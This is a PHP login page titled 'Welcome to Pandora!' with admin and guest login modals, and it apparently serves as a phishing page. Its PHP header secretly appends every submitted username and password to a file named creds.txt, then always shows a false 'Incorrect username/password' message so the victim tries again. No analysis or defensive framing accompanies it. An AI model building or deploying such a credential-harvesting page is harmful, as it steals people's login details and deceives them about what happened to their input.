<?php
$err = "";
if (!empty($_POST)) {
  $user = $_POST['username'];
  $pass = $_POST['password'];
  file_put_contents('creds.txt',"$user $pass\n",FILE_APPEND);
  $err = "Incorrect username/password. Try again.";
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <link rel="apple-touch-icon" sizes="76x76" href="./assets/img/apple-icon.png">
        <link rel="icon" type="image/png" href="./assets/img/favicon.png">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <title>Welcome to Pandora!</title>
        <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
        <!--     Fonts and icons     -->
        <link href="./assets/css/GoogleFontMontserrat.css" rel="stylesheet" />
        <link rel="stylesheet" href="./assets/css/font-awesome.min.css" />
        <!-- CSS Files -->
        <link href="./assets/css/bootstrap.min.css" rel="stylesheet" />
        <link href="./assets/css/now-ui-kit.css?v=1.1.0" rel="stylesheet" />
        <!-- CSS Just for demo purpose, don't include it in your project -->
        <link href="./assets/css/demo.css" rel="stylesheet" />
        <link href="./assets/css/custom.css" rel="stylesheet" />
    </head>
    <body class="login-page sidebar-collapse">
        <div class="page-header" filter-color="orange">
            <div class="page-header-image" style="background-image:url(./assets/img/space.gif)"></div>
            <div class="container">
                <div class="col-md-4 content-center">
                    <div class="photo-container logo">
                        <img src="./assets/img/pandico.png" alt="">
                    </div>
                    <h5 class="welcome-message">Welcome to Pandora!</h5>
                    <div class="card card-login card-plain">
                        <div class="button-holder text-center">
                            <a href="#pablo" class="btn btn-primary btn-round btn-lg btn-block" data-toggle="modal" data-target="#adminModal">Login as Admin</a>
                        </div>
                        <div class="button-holder text-center">
                            <a href="#pablo" class="btn btn-primary btn-round btn-lg btn-block" data-toggle="modal" data-target="#guestModal">Login as Guest</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Mini Modal -->
        <div class="modal fade modal-mini modal-primary" id="guestModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        <input type="text" class="form-control" placeholder="Username">
                    </div>
                    <div class="modal-footer">
                        <div style="margin-left: 33%">
                            <button type="button" class="btn btn-success btn-round btn-lg btn-block" style="color:white">Done</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade modal-mini modal-primary" id="adminModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        <input type="text" class="form-control" placeholder="Admin Password">
                    </div>
                    <div class="modal-footer">
                        <div style="margin-left: 33%">
                            <button type="button" class="btn btn-success btn-round btn-lg btn-block" style="color:white">Done</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
    <!--   Core JS Files   -->
    <script src="./assets/js/core/jquery.3.2.1.min.js" type="text/javascript"></script>
    <script src="./assets/js/core/popper.min.js" type="text/javascript"></script>
    <script src="./assets/js/core/bootstrap.min.js" type="text/javascript"></script>
    <!--  Plugin for Switches, full documentation here: http://www.jque.re/plugins/version3/bootstrap.switch/ -->
    <script src="./assets/js/plugins/bootstrap-switch.js"></script>
    <!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
    <script src="./assets/js/plugins/nouislider.min.js" type="text/javascript"></script>
    <!--  Plugin for the DatePicker, full documentation here: https://github.com/uxsolutions/bootstrap-datepicker -->
    <script src="./assets/js/plugins/bootstrap-datepicker.js" type="text/javascript"></script>
    <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc -->
    <script src="./assets/js/now-ui-kit.js?v=1.1.0" type="text/javascript"></script>
</html>
